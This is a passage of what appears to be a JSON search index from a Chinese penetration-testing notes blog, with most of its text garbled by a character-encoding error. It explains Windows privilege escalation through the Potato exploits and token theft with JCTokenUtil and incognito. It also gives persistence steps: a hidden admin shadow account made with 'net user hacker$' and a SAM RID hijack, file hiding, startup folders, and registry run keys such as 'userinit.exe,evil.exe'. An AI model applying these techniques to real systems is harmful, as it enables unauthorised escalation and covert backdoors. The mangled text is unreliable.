ï¼ˆ2ï¼‰ä¸­é—´äººæ­¤èº«ä»½éªŒè¯å°è¯•ï¼ˆNTLM ä¸­ç»§ï¼‰åœ¨æœ¬åœ°åå•†â€œNT AUTHORITY\\SYSTEMâ€å¸æˆ·çš„å®‰å…¨ä»¤ç‰Œã€‚è¿™æ˜¯é€šè¿‡ä¸€ç³»åˆ— Windows API è°ƒç”¨å®Œæˆçš„ã€‚ ï¼ˆ3ï¼‰å†’å……æˆ‘ä»¬åˆšåˆšåå•†å¥½çš„ä»¤ç‰Œã€‚ä»…å½“æ”»å‡»è€…å½“å‰å¸æˆ·æœ‰æƒæ¨¡æ‹Ÿå®‰å…¨ä»¤ç‰Œæ—¶ï¼Œæ‰èƒ½åšåˆ°è¿™ä¸€ç‚¹ã€‚è¿™é€šå¸¸é€‚ç”¨äºå¤§å¤šæ•°æœåŠ¡å¸æˆ·ï¼Œè€Œä¸é€‚ç”¨äºå¤§å¤šæ•°ç”¨æˆ·çº§å¸æˆ·ã€‚\nä¼˜ç‚¹ï¼š\n100%å¯é  å…¨ç‰ˆæœ¬é€šæ€ ç«‹å³ç”Ÿæ•ˆï¼Œä¸ç”¨åƒhot potatoé‚£æ ·æœ‰æ—¶å€™éœ€è¦ç­‰Windowsæ›´æ–°æ‰èƒ½ä½¿ç”¨ã€‚ Juicy Potato ms16-075çš„ä¸€ä¸ªå˜ç§ï¼ŒåŸç†å’Œrotten potatoå‡ ä¹ç›¸åŒï¼Œåªæ˜¯å¢åŠ äº†ä¸€ç‚¹æ‰©å±•https://github.com/ohpe/juicy-potato\nUknowSecè¿˜æœ‰ä¸€ä¸ªäºŒå¼€ç‰ˆæœ¬ï¼Œè‡ªè¡Œäº†è§£\nåˆ©ç”¨é“¾å¦‚ä¸‹ï¼š\nåŠ è½½COMï¼Œå‘å‡ºè¯·æ±‚ï¼Œæƒé™ä¸º System,åœ¨æŒ‡å®šipå’Œç«¯å£çš„ä½ç½®å°è¯•åŠ è½½ä¸€ä¸ªCOMå¯¹è±¡ã€‚\nRottenPotatoNG ä½¿ç”¨çš„ COM å¯¹è±¡ä¸º BITS ï¼ŒCLSIDä¸º{4991d34b-80a1-4291-83b6-3328366b9097} å¯ä¾›é€‰æ‹©çš„COMå¯¹è±¡ä¸å”¯ä¸€ï¼ŒJuicy Potato æä¾›äº†å¤šä¸ªï¼Œè¯¦ç»†åˆ—è¡¨å¯å‚è€ƒåœ°å€ï¼šhttps://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md\nå›åº”æ­¥éª¤1çš„è¯·æ±‚ï¼Œå‘èµ·NTLMè®¤è¯ï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œç”±äºæƒé™ä¸è¶³ï¼Œå½“å‰æƒé™ä¸æ˜¯Systemï¼Œæ— æ³•è®¤è¯æˆåŠŸã€‚\né’ˆå¯¹æœ¬åœ°ç«¯å£ï¼ŒåŒæ ·å‘èµ·NTLMè®¤è¯ï¼Œæƒé™ä¸ºå½“å‰ç”¨æˆ·ã€‚ç”±äºæƒé™ä¸ºå½“å‰ç”¨æˆ·ï¼Œæ‰€ä»¥NTLMè®¤è¯èƒ½å¤ŸæˆåŠŸå®Œæˆã€‚RottenPotatoNG ä½¿ç”¨çš„ 135 ç«¯å£ã€‚\nJuicy Potato æ”¯æŒæŒ‡å®šä»»æ„æœ¬åœ°ç«¯å£ï¼Œä½†æ˜¯RPCä¸€èˆ¬é»˜è®¤ä¸º135ç«¯å£ï¼Œå¾ˆå°‘è¢«ä¿®æ”¹ã€‚\nåˆ†åˆ«æ‹¦æˆªä¸¤ä¸ªNTLMè®¤è¯çš„æ•°æ®åŒ…ï¼Œæ›¿æ¢æ•°æ®ï¼Œé€šè¿‡NTLMé‡æ”¾ä½¿å¾—æ­¥éª¤1(æƒé™ä¸ºSystem)çš„NTLMè®¤è¯é€šè¿‡ï¼Œè·å¾—Systemæƒé™çš„Token,é‡æ”¾æ—¶éœ€è¦æ³¨æ„NTLMè®¤è¯çš„NTLM Server Challengeä¸åŒï¼Œéœ€è¦ä¿®æ­£ã€‚\nåˆ©ç”¨Systemæƒé™çš„Tokenåˆ›å»ºæ–°è¿›ç¨‹\nå¦‚æœå¼€å¯SeImpersonateæƒé™ï¼Œè°ƒç”¨CreateProcessWithTokenï¼Œä¼ å…¥Systemæƒé™çš„Tokenï¼Œåˆ›å»ºçš„è¿›ç¨‹ä¸ºSystemæƒé™ã€‚\nå¦‚æœå¼€å¯SeAssignPrimaryTokenæƒé™ï¼Œè°ƒç”¨CreateProcessAsUserï¼Œä¼ å…¥Systemæƒé™çš„Tokenï¼Œåˆ›å»ºçš„è¿›ç¨‹ä¸ºSystemæƒé™\nä¸Šé¢ä¸¤ä¸ªpotatoä»…é€‚ç”¨äºwin10 v1809å’Œwin server 2019ä¹‹å‰ç‰ˆæœ¬çš„ç³»ç»Ÿï¼Œåœ¨ä¹‹åçš„ç‰ˆæœ¬ä¸­ï¼Œå¾®è½¯é€šè¿‡æ£€æŸ¥RPCç»‘å®šå­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„ç«¯å£æ¥ä¿®å¤äº†è¯¥é—®é¢˜ï¼Œæ— æ³•å†ä½¿ç”¨åŸæ¥çš„æ–¹æ³•è¿›è¡Œä¸­é—´äººæ”»å‡»\nPrintSpooferï¼ˆPipe Potatoï¼‰ é€šè¿‡Windows named pipeçš„ä¸€ä¸ªAPI: ImpersonateNamedPipeClientæ¥æ¨¡æ‹Ÿé«˜æƒé™å®¢æˆ·ç«¯çš„tokenï¼ˆè¿˜æœ‰ç±»ä¼¼çš„ImpersonatedLoggedOnUserï¼ŒRpcImpersonateClientå‡½æ•°ï¼‰ï¼Œè°ƒç”¨è¯¥å‡½æ•°åä¼šæ›´æ”¹å½“å‰çº¿ç¨‹çš„å®‰å…¨\nä½†å½“ä¼ é€’\\\\127.0.0.1/pipe/fooæ—¶ï¼Œæ ¡éªŒè·¯å¾„æ—¶ä¼šè®¤ä¸º127.0.0.1/pipe/fooæ˜¯ä¸»æœºåï¼Œéšååœ¨è¿æ¥named pipeæ—¶ä¼šå¯¹å‚æ•°åšæ ‡å‡†åŒ–ï¼Œå°†/è½¬åŒ–ä¸º\\ï¼Œäºæ˜¯å°±ä¼šè¿æ¥\\\\127.0.0.1\\pipe\\foo\\pipe\\spoolssï¼Œæ”»å‡»è€…å°±å¯ä»¥æ³¨å†Œè¿™ä¸ªnamed pipeä»è€Œçªƒå–clientçš„token\nç®€å•æ¥è¯´å°±æ˜¯ï¼šåˆ©ç”¨äº†æ‰“å°æœºç»„ä»¶è·¯å¾„æ£€æŸ¥çš„BUGï¼Œä½¿SYSTEMæƒé™æœåŠ¡èƒ½è¿æ¥åˆ°æ”»å‡»è€…åˆ›å»ºçš„named pipe\nSweet Potato Juicy Potato çš„é‡å†™https://github.com/CCob/SweetPotato\nCOM/WinRM/Spoolsv çš„é›†åˆç‰ˆï¼Œä¹Ÿå°±æ˜¯ Juicy/PrintSpooferï¼Œå¯ç”¨äºä»Windows 7 åˆ° windows10/windows server2019çš„æœ¬åœ°æœåŠ¡åˆ°systemç‰¹æƒå‡çº§\n",
        "summary": "windowsææƒ-è®¿é—®ä»¤ç‰Œæ“çºµ Windowsè®¿é—®ä»¤ç‰Œ ä»¤ç‰Œï¼ˆTokenï¼‰æ˜¯ç³»ç»Ÿçš„ä¸´æ—¶å¯†é’¥ï¼Œç›¸å½“äºè´¦æˆ·åå’Œå¯†ç ï¼Œç”¨æ¥å†³å®šæ˜¯å¦å…è®¸è¿™æ¬¡è¯·æ±‚å’Œåˆ¤æ–­è¿™æ¬¡è¯·æ±‚æ˜¯å±äºå“ªä¸€ä¸ªç”¨æˆ·çš„ï¼Œå®ƒå…è®¸ä½ åœ¨ä¸æä¾›å¯†ç æˆ–å…¶ä»–å‡­è¯çš„å‰æä¸‹ï¼Œè®¿é—®ç½‘ç»œå’Œç³»ç»Ÿèµ„æºï¼Œè¿™äº›ä»¤ç‰ŒæŒç»­å­˜åœ¨ç³»ç»Ÿä¸­ï¼Œé™¤éç³»ç»Ÿé‡æ–°å¯åŠ¨\nä»¤ç‰Œæœ€å¤§çš„ç‰¹ç‚¹å°±æ˜¯éšæœºæ€§ï¼Œä¸å¯é¢„æµ‹ï¼Œä¸€èˆ¬é»‘å®¢æˆ–è½¯ä»¶æ— æ³•çŒœæµ‹å‡ºæ¥ï¼Œä»¤ç‰Œæœ‰å¾ˆå¤šç§ï¼š\nè®¿é—®ä»¤ç‰Œï¼ˆAccess Tokenï¼‰è¡¨ç¤ºè®¿é—®æ§åˆ¶æ“ä½œä¸»é¢˜çš„ç³»ç»Ÿå¯¹è±¡ ä¼šè¯ä»¤ç‰Œï¼ˆSession Tokenï¼‰ï¼šæ˜¯äº¤äº’ä¼šè¯ä¸­å”¯ä¸€çš„èº«ä»½æ ‡è¯†ç¬¦ï¼Œå¯ä»¥ç†è§£ä¸ºwebä¸­çš„token å¯†ä¿ä»¤ç‰Œï¼ˆSecurity Tokenï¼‰åˆå«ä½œè®¤è¯ä»¤ç‰Œæˆ–è€…ç¡¬ä»¶ä»¤ç‰Œï¼Œæ˜¯ä¸€ç§è®¡ç®—æœºèº«ä»½æ•ˆéªŒçš„ç‰©ç†è®¾å¤‡ Windows çš„è®¿é—®ä»¤ç‰Œï¼ˆAccessTokenï¼‰ ä¸­åŒ…å«å¦‚ä¸‹å†…å®¹\nç”¨æˆ·è´¦æˆ·çš„å®‰å…¨æ ‡è¯†ç¬¦(SID) ç”¨æˆ·æ‰€å±çš„ç»„çš„SID ç”¨äºæ ‡è¯†å½“å‰ç™»é™†ä¼šè¯çš„ç™»é™†SID ç”¨æˆ·æˆ–ç”¨æˆ·ç»„æ‰€æ‹¥æœ‰çš„æƒé™åˆ—è¡¨ æ‰€æœ‰è€…SID ä¸»è¦ç»„çš„SID è®¿é—®æ§åˆ¶åˆ—è¡¨ è®¿é—®ä»¤ç‰Œçš„æ¥æº ä»¤ç‰Œæ˜¯ä¸»è¦ä»¤ç‰Œè¿˜æ˜¯æ¨¡æ‹Ÿä»¤ç‰Œ é™åˆ¶SIDçš„å¯é€‰åˆ—è¡¨ ç›®å‰çš„æ¨¡æ‹Ÿç­‰çº§ å…¶ä»–ç»Ÿè®¡çš„æ•°æ® Windows çš„è®¿é—®ä»¤ç‰Œï¼ˆAccessTokenï¼‰ æœ‰ä¸¤ç§ç±»å‹\nDelegation Tokenï¼šæˆæƒä»¤ç‰Œï¼Œä¹Ÿå«ä¸»ä»¤ç‰Œï¼Œæ”¯æŒäº¤äº’å¼ä¼šè¯ç™»å½• (ä¾‹å¦‚æœ¬åœ°ç”¨æˆ·ç›´æ¥ç™»å½•ã€è¿œç¨‹æ¡Œé¢ç™»å½•è®¿é—®)\nImpresonation Tokenï¼šæ¨¡æ‹Ÿä»¤ç‰Œï¼Œæ”¯æŒéäº¤äº’çš„ä¼šè¯ (ä¾‹å¦‚ä½¿ç”¨ net useè®¿é—®å…±äº«æ–‡ä»¶å¤¹)ã€‚\nä¸¤ç§ token åªåœ¨ç³»ç»Ÿé‡å¯åæ¸…é™¤ï¼Œå…·æœ‰ Delegation token çš„ç”¨æˆ·åœ¨æ³¨é”€åï¼Œè¯¥ Token å°†å˜æˆImpersonation tokenï¼ˆæ¨¡æ‹Ÿä»¤ç‰Œï¼‰ï¼Œä¾æ—§æœ‰æ•ˆ\nå€¼å¾—ä¸€æçš„æ˜¯ï¼Œä»¤ç‰Œçªƒå–åªèƒ½åœ¨ç‰¹æƒç”¨æˆ·ä¸Šä¸‹æ–‡ä¸­æ‰èƒ½å®Œæˆï¼Œå› ä¸ºé€šè¿‡ä»¤ç‰Œåˆ›å»ºè¿›ç¨‹ä½¿ç”¨çš„CreateProcessWithTokenWå’ŒCreateProcessAsUserAä¸¤ä¸ªwindows APIåˆ†åˆ«è¦æ±‚ç”¨æˆ·å¿…é¡»æ‹¥æœ‰SeImpersonatePrivilegeå’ŒSeAssignPrimaryTokenPrivilege/SeIncreaseQuotaPrivilegeç‰¹æƒï¼Œè€Œæ‹¥æœ‰è¿™ä¸¤ä¸ªç‰¹æƒçš„ç”¨æˆ·ä¸€èˆ¬ä¸ºç³»ç»Ÿç®¡ç†å‘˜è´¦æˆ·ã€ç½‘ç»œæœåŠ¡è´¦æˆ·ã€ç³»ç»ŸæœåŠ¡è´¦æˆ·ï¼ˆIISã€MSSQLç­‰ï¼‰\nä»¤ç‰Œçªƒå– è¯¥æ“ä½œå¾€å¾€ç”¨æ¥å°†ç®¡ç†å‘˜æƒé™æå‡è‡³SYSTEMã€TrustedInstallerç­‰æ›´é«˜æƒé™ï¼Œè‹¥æœ¬åœ°ç®¡ç†å‘˜å› ä¸ºæŸäº›ç»„ç­–ç•¥è®¾ç½®æ— æ³•è·å–æŸäº›ç‰¹æƒï¼Œå¯ä»¥é€šè¿‡ä»¤ç‰Œçªƒå–æ¥å‡å†’NT AUTHORITY\\SYSTEMçš„ä»¤ç‰Œ\nåˆ©ç”¨JCTokenUtilçªƒå–ä»¤ç‰Œ æœ¬æ¥æƒ³ä½¿ç”¨incognito.exeçš„ï¼Œä½†æ˜¯å‘ç°äº†ä¸€æ¬¾incognito.exeäºŒå¼€å·¥å…·JCTokenUtilï¼Œæ„Ÿè§‰æ›´å¥½ç”¨\né¦–å…ˆä¸Šä¼ å·¥å…·è‡³ç›®æ ‡ä¸»æœºï¼Œæ‰§è¡Œå‘½ä»¤è·å–NT AUTHORITY\\SYSTEMè´¦æˆ·çš„ä»¤ç‰Œï¼š\nTokenUtil_x64.exe ListTokens -u \u0026#34;NT AUTHORITY\\SYSTEM\u0026#34; å†è¯•è¯•ç”¨è·å–åˆ°çš„NT AUTHORITY\\SYSTEMè´¦æˆ·ä»¤ç‰Œæ‰§è¡Œå‘½ä»¤ï¼š\nTokenUtil_x64.exe Execute -p 304 -e whoami -c åˆ©ç”¨metasploitçªƒå–ä»¤ç‰Œ msfåŒæ ·å†…ç½®äº†incognitoæ¡†æ¶ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨\n"
    }
,
    {
        "title": "windowsæƒé™ç»´æŒ",
        "link": "/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/",
        "content": "windowsæƒé™ç»´æŒ æœ€ä¸»è¦å°±æ˜¯æƒ³ä¸€äº›åŠæ³•è®©æˆ‘ä»¬çš„åé—¨èƒ½å¤Ÿè‡ªä¸»æ‰§è¡Œä»è€Œè®©æˆ‘ä»¬ä¸€ç›´æ‹¥æœ‰ç›®æ ‡ä¸»æœºçš„æƒé™ï¼Œå¾ˆå¤šæ“ä½œä¹Ÿç±»ä¼¼äºæƒé™æå‡\næ–‡ä»¶ç‰¹æ€§ å’Œlinuxä¸€æ ·ï¼Œæ–‡ä»¶å±‚é¢ä¸Šçœ‹ï¼Œæœ‰ä¸€äº›éšè—æ–‡ä»¶çš„æ–¹æ³•\nattrib attrib +s +a +h +r c:\\test sï¼šè®¾ç½®ç³»ç»Ÿå±æ€§ï¼ˆSystemï¼‰ aï¼šè®¾ç½®å­˜æ¡£å±æ€§ï¼ˆArchiveï¼‰ hï¼šè®¾ç½®éšè—å±æ€§ï¼ˆHiddenï¼‰\nrï¼šè®¾ç½®åªè¯»å±æ€§ï¼ˆRead-onlyï¼‰\nå¦‚æ­¤å³å¯è¿›è¡Œéšè—\nå¦‚æœè¦æŸ¥çœ‹ï¼Œéœ€è¦åŠ ä¸Š/aå‚æ•°ï¼š\ndir /a å½“ç„¶ï¼Œåˆ é™¤å¯¹åº”å±æ€§ä¹Ÿèƒ½é‡æ–°æ˜¾ç¤ºå‡ºæ¥ï¼š\nattrib -s -a -h -r c:\\test ç³»ç»Ÿå›¾æ ‡éšè— å¯ä»¥æŠŠæ–‡ä»¶å¤¹çš„åç§°é‡å‘½åä¸º æˆ‘çš„ç”µè„‘.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\nè¿™æ ·ï¼Œå›¾æ ‡å˜æˆäº†æˆ‘çš„ç”µè„‘ï¼ŒåŒå‡»ä¹Ÿæ˜¯å¯ä»¥åˆ°è¾¾æˆ‘çš„ç”µè„‘ï¼Œä¸èƒ½è¿›å…¥æŸ¥çœ‹æˆ‘ä»¬æ–‡ä»¶å¤¹çš„å†…å®¹\næ­¤æ—¶ï¼Œåªèƒ½ä½¿ç”¨å‘½ä»¤è¡ŒæŸ¥çœ‹å’Œè®¿é—®è¯¥æ–‡ä»¶å¤¹ï¼š\nå¸¸ç”¨çš„åç§°å¦‚ä¸‹ï¼š\næˆ‘çš„ç”µè„‘.{20D04FE0-3AEA-1069-A2D8-08002B30309D} å›æ”¶ç«™.{645ff040-5081-101b-9f08-00aa002f954e} æ‹”å·ç½‘ç»œ.{992CFFA0-F557-101A-88EC-00DD010CCC48} æ‰“å°æœº.{2227a280-3aea-1069-a2de-08002b30309d} æ§åˆ¶é¢æ¿.{21ec2020-3aea-1069-a2dd-08002b30309d} ç½‘ä¸Šé‚»å±….{208D2C60-3AEA-1069-A2D7-08002B30309D} ç•¸å½¢åç§° åˆ›å»ºæ–‡ä»¶åç§°ä¸º test...\\ æ˜¾ç¤ºåç§°æ˜¯ test...\nè¿™ä¸ªæ–‡ä»¶å¯ä»¥çœ‹åˆ°ï¼Œä½†æ˜¯ä¸èƒ½è®¿é—®å†…éƒ¨æ–‡ä»¶ï¼Œä¹Ÿä¸èƒ½åˆ é™¤\nmd test...\\ copy 1111.txt test...\\ æ­¤æ—¶è¿™ä¸ªæ–‡ä»¶æ˜¾ç¤ºå‡ºæ¥çš„åç§°ä¸ºtest\u0026hellip;\nä»¥è¿™ä¸ªåç§°è¿›è¡Œæ–‡ä»¶æ“ä½œå§‹ç»ˆä¼šå¤±è´¥ï¼š\nå‘½ä»¤è¡Œè¿›å…¥å¤±è´¥ï¼š\nç›´æ¥ç‚¹ä¹Ÿç‚¹ä¸å¼€ï¼Œæˆ–è€…ç‚¹å¼€åé‡Œé¢çš„æ–‡ä»¶ä¹Ÿæ— æ³•æ‰“å¼€ï¼š\næ— æ³•ç›´æ¥åˆ é™¤ï¼š\nå¦‚æœæƒ³è¦åˆ é™¤è¯¥æ–‡ä»¶ï¼Œå¯ä»¥å¦‚ä¸‹æ“ä½œï¼š\nrd /s /q c:\\test...\\ /s è¡¨ç¤ºé€’å½’åœ°åˆ é™¤æŒ‡å®šç›®å½•åŠæ‰€æœ‰å­ç›®å½•ä¸­çš„æ–‡ä»¶ã€‚ /q è¡¨ç¤ºå®‰é™æ¨¡å¼ï¼Œå³ä¸æç¤ºç¡®è®¤ç›´æ¥åˆ é™¤ã€‚ é©±åŠ¨çº§æ–‡ä»¶éšè— é©±åŠ¨éšè—æœ€å…¸å‹çš„ç°è±¡å°±æ˜¯ç³»ç»Ÿç›˜ä¸­å­˜åœ¨ä»¥ä¸‹æ–‡ä»¶ï¼š\nc:\\WINDOWS\\xlkfs.dat c:\\WINDOWS\\xlkfs.dll c:\\WINDOWS\\xlkfs.ini c:\\WINDOWS\\system32\\drivers\\xlkfs.sys é©±åŠ¨éšè—æˆ‘ä»¬å¯ä»¥ç”¨Easy File Lockeræ¥å®ç°\nè®¾ç½®æ–‡ä»¶ï¼šåªå‹¾é€‰Accessibleï¼Œè¿™æ ·ï¼Œè¯¥æ–‡ä»¶ä¸ä¼šæ˜¾ç¤ºï¼Œä¸èƒ½é€šè¿‡åˆ—ç›®å½•åˆ—å‡ºæ¥ï¼Œä¹Ÿä¸èƒ½åˆ é™¤ï¼Œåªæœ‰çŸ¥é“å®Œæ•´è·¯å¾„ï¼Œæ‰å¯ä»¥è¯»å–æ–‡ä»¶å†…å®¹ï¼š\nå¹¶ä¸”è¯¥è½¯ä»¶è¿˜å¯ä»¥è®¾ç½®å¯†ç ï¼Œå¯åŠ¨ã€ä¿®æ”¹è®¾ç½®ã€å¸è½½åŠé‡å¤å®‰è£…çš„æ—¶å€™éƒ½éœ€è¦å¯†ç ï¼Œä¸»ç•Œé¢ã€å¸è½½ç¨‹åºç­‰éƒ½å¯ä»¥åˆ é™¤ï¼Œåªç•™ä¸‹æ ¸å¿ƒçš„é©±åŠ¨æ–‡ä»¶å°±è¡Œ\nè¦æƒ³åˆ é™¤\næŸ¥è¯¢æœåŠ¡çŠ¶æ€ï¼š sc qc xlkfs åœæ­¢æœåŠ¡ï¼š net stop xlkfs æœåŠ¡åœæ­¢ä»¥åï¼Œç»é©±åŠ¨çº§éšè—çš„æ–‡ä»¶å³å¯æ˜¾ç° åˆ é™¤æœåŠ¡ï¼š sc delete xlkfs åˆ é™¤ç³»ç»Ÿç›®å½•ä¸‹é¢çš„æ–‡ä»¶ï¼Œé‡å¯ç³»ç»Ÿï¼Œç¡®è®¤æœåŠ¡å·²ç»è¢«æ¸…ç†äº† ç³»ç»Ÿåé—¨ å½±å­è´¦æˆ· æƒé™è¦æ±‚ï¼šéœ€è¦æå‡è‡³ç®¡ç†å‘˜+ç™»å½•æ¡Œé¢\nç®€å•æ¥è¯´å°±æ˜¯ä¸€ä¸ªéšè—çš„è´¦æˆ·ï¼Œåªèƒ½åœ¨æ³¨å†Œè¡¨ä¸­æ‰¾åˆ°\nåˆ›å»ºæ­¥éª¤å¦‚ä¸‹ï¼š\nåˆ›å»ºâ€hacker$â€œç”¨æˆ·ï¼š\nnet user hacker$ hacker@123 /add è¿™é‡Œçš„$è¡¨ç¤ºéšè—è´¦æˆ·ï¼Œå‘½ä»¤è¡Œå·²ç»æ— æ³•æŸ¥è¯¢åˆ°è¿™ä¸ªç”¨æˆ·äº†ï¼Œä½†æ˜¯åœ¨æ§åˆ¶é¢æ¿ã€è®¡ç®—æœºç®¡ç†çš„æœ¬åœ°ç”¨æˆ·å’Œç»„ä¸­ä¾ç„¶å¯ä»¥çœ‹è§è¯¥ç”¨æˆ·\nregeditæ‰“å¼€æ³¨å†Œè¡¨ç®¡ç†å™¨ï¼ŒHKEY_LOCAL_MACHINE\\SAM\\SAMçš„administratoræƒé™æ›´æ”¹ä¸ºå®Œå…¨æ§åˆ¶ï¼š\nè¿›å…¥HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names\\Administratorï¼Œæ‰¾åˆ°å’Œadminé”®å€¼ç›¸åŒçš„ç›®å½•ï¼š\nå¤åˆ¶è¯¥ç›®å½•è¡¨é¡¹çš„Få±æ€§çš„å€¼ï¼š\nç›¸åŒæ–¹æ³•æ‰¾åˆ°hacker$ç›®å½•å°†å¤åˆ¶çš„adminå±æ€§ç²˜è´´è¿›Få±æ€§ï¼ˆè¿™é‡Œå…¶å®æ˜¯hacker$ç”¨æˆ·åŠ«æŒäº†adminçš„RIDï¼Œä»è€Œä½¿hacker$è·å¾—äº†adminçš„æƒé™ï¼‰\nå°†hacker$å’Œå¯¹åº”çš„03EBè¡¨é¡¹å¯¼å‡º\nåˆ é™¤åŸæ¥åˆ›å»ºçš„ç”¨æˆ·ï¼š\nnet user hacker$ /del å°†å¯¼å‡ºçš„æ³¨å†Œè¡¨é¡¹é‡æ–°å¯¼å›ï¼š\nå¯¼å…¥å®Œæˆåï¼Œå°±ç®—æ˜¯åˆ›å»ºå®Œæˆäº†ï¼Œå½±å­è´¦æˆ·æ‹¥æœ‰ç®¡ç†å‘˜æƒé™ï¼Œå¹¶ä¸”åªåœ¨æ³¨å†Œè¡¨ä¸­å¯è§ï¼Œå‘½ä»¤è¡Œã€æŸ¥çœ‹æœ¬ä½“ç”¨æˆ·å’Œç»„éƒ½æ‰¾ä¸åˆ°è¯¥ç”¨æˆ·ï¼š\nStartupç›®å½• æƒé™è¦æ±‚ï¼šä¸ç”¨ææƒ\næœ€å¸¸ç”¨ä¹Ÿæ˜¯æœ€ç®€å•çš„æƒé™ç»´æŒï¼Œæ”¾åœ¨è¯¥ç›®å½•ä¸‹çš„ç¨‹åºæˆ–å¿«æ·æ–¹å¼ä¼šåœ¨ç”¨æˆ·ç™»å½•æ—¶è‡ªåŠ¨è¿è¡Œ\nè‡ªå¯åŠ¨ç›®å½•æœ‰ä¸¤ç§å†™æ³•ï¼Œå› windowsç‰ˆæœ¬è€Œä¸åŒ\nNT6ä»¥åï¼ˆå³Windows Vista åŠä»¥åï¼‰çš„ç›®å½•å¦‚ä¸‹ï¼š\nå¯¹å½“å‰ç”¨æˆ·æœ‰æ•ˆï¼š C:\\Users\\Username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup å¯¹æ‰€æœ‰ç”¨æˆ·æœ‰æ•ˆï¼š C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp NT6ä»¥å‰çš„ç›®å½•å¦‚ä¸‹ï¼š\nå¯¹å½“å‰ç”¨æˆ·æœ‰æ•ˆï¼š C:\\Documents and Settings\\Hunter\\ã€Œå¼€å§‹ã€èœå•\\ç¨‹åº\\å¯åŠ¨ å¯¹æ‰€æœ‰ç”¨æˆ·æœ‰æ•ˆï¼š C:\\Documents and Settings\\All Users\\ã€Œå¼€å§‹ã€èœå•\\ç¨‹åº\\å¯åŠ¨ æ³¨å†Œé”® æƒé™è¦æ±‚ï¼šæ— éœ€ææƒ\næ³¨å†Œè¡¨è‡ªå¯é¡¹ä¹Ÿæ˜¯æ¯”è¾ƒå¸¸ç”¨çš„æŒä¹…åŒ–æ“ä½œ\nWindowsåœ¨æ³¨å†Œè¡¨ä¸­æä¾›äº†ä¸¤å¥—ç‹¬ç«‹çš„è·¯å¾„ï¼Œä¸€ä¸ªæ˜¯ä¸Šé¢æåˆ°çš„å½“å‰ç”¨æˆ·çš„â€œHKEY_CURRENT_USERâ€å³â€œHKCUâ€ï¼ˆæ”¹åŠ¨ä¸éœ€è¦ç®¡ç†å‘˜æƒé™ï¼‰ï¼Œå¦ä¸€ä¸ªå°±æ˜¯é’ˆå¯¹å½“å‰ç”¨æˆ·ç‰©ç†çŠ¶æ€çš„â€œHKEY_LOCAL_MACHINEâ€å³â€œHKLMâ€ï¼Œä»…æœ‰ç‰¹æƒè´¦æˆ·å¯ä»¥å¯¹å…¶è¿›è¡Œä¿®æ”¹ã€‚\néšç€å®‰å…¨æ„è¯†çš„æé«˜ï¼Œç›®å‰åœ¨çº¢é˜Ÿä¸­æåˆ°çš„Windowså¤§å¤šéƒ½æ˜¯é™æƒçš„ã€‚ç‰¹åˆ«æ˜¯é’“é±¼å¾—åˆ°çš„PCæœºææƒçš„æ„ä¹‰ä¸å¤§ï¼Œå› ä¸ºå³ä½¿ææƒå†™äº†Administratorçš„å¯åŠ¨é¡¹ï¼Œç”¨æˆ·ä¸‹ä¸€æ¬¡ç™»å½•ä¹Ÿè¿˜æ˜¯è¿›è‡ªå·±çš„è´¦æˆ·ï¼ŒæŒä¹…åŒ–å°±ç™½åšäº†\nWindowsä¸‹çš„æ‰€æœ‰æ³¨å†Œé”®å¦‚ä¸‹ï¼š\n1.Loadæ³¨å†Œé”® HKEY_CURRENT_USERï¼¼Softwareï¼¼Microsoftï¼¼Windows NTï¼¼CurrentVersionï¼¼Windowsï¼¼load 2.Userinitæ³¨å†Œé”® HKEY_LOCAL_MACHINEï¼¼Softwareï¼¼Microsoftï¼¼Windows NTï¼¼CurrentVersionï¼¼Winlogonï¼¼Userinit é€šå¸¸è¯¥æ³¨å†Œé”®ä¸‹é¢æœ‰ä¸€ä¸ªuserinit.exeã€‚è¯¥é”®å…è®¸æŒ‡å®šç”¨é€—å·åˆ†éš”çš„å¤šä¸ªç¨‹åºï¼Œå¦‚userinit.exe,evil.exeã€‚ 3.Explorerï¼¼Runæ³¨å†Œé”® Explorerï¼¼Runé”®åœ¨HKEY_CURRENT_USERå’ŒHKEY_LOCAL_MACHINEä¸‹éƒ½æœ‰ã€‚ HKEY_CURRENT_USERï¼¼Softwareï¼¼Microsoftï¼¼Windowsï¼¼CurrentVersionï¼¼Policiesï¼¼Explorerï¼¼Run HKEY_LOCAL_MACHINEï¼¼Softwareï¼¼Microsoftï¼¼Windowsï¼¼CurrentVersionï¼¼Policiesï¼¼Explorerï¼¼Run Explorerï¼¼Runé”®åœ¨HKEY_CURRENT_USERå’ŒHKEY_LOCAL_MACHINEä¸‹éƒ½æœ‰ã€‚ 4.RunServicesOnceæ³¨å†Œé”® RunServicesOnceæ³¨å†Œé”®ç”¨æ¥å¯åŠ¨æœåŠ¡ç¨‹åºï¼Œå¯åŠ¨æ—¶é—´åœ¨ç”¨æˆ·ç™»å½•ä¹‹å‰ï¼Œè€Œä¸”å…ˆäºå…¶ä»–é€šè¿‡æ³¨å†Œé”®å¯åŠ¨çš„ç¨‹åºï¼Œåœ¨HKEY_CURRENT_USERå’ŒHKEY_LOCAL_MACHINEä¸‹éƒ½æœ‰ã€‚ HKEY_CURRENT_USERï¼¼Softwareï¼¼Microsoftï¼¼Windowsï¼¼CurrentVersionï¼¼RunServicesOnce HKEY_LOCAL_MACHINEï¼¼Softwareï¼¼Microsoftï¼¼ Windowsï¼¼CurrentVersionï¼¼RunServicesOnce 5.RunServicesæ³¨å†Œé”® RunServicesæ³¨å†Œé”®æŒ‡å®šçš„ç¨‹åºç´§æ¥RunServicesOnceæŒ‡å®šçš„ç¨‹åºä¹‹åè¿è¡Œï¼Œä½†ä¸¤è€…éƒ½åœ¨ç”¨æˆ·ç™»å½•ä¹‹å‰ã€‚ HKEY_CURRENT_USERï¼¼Softwareï¼¼Microsoftï¼¼Windowsï¼¼CurrentVersionï¼¼ RunServices HKEY_LOCAL_MACHINEï¼¼Softwareï¼¼Microsoftï¼¼Windowsï¼¼ CurrentVersionï¼¼RunServices 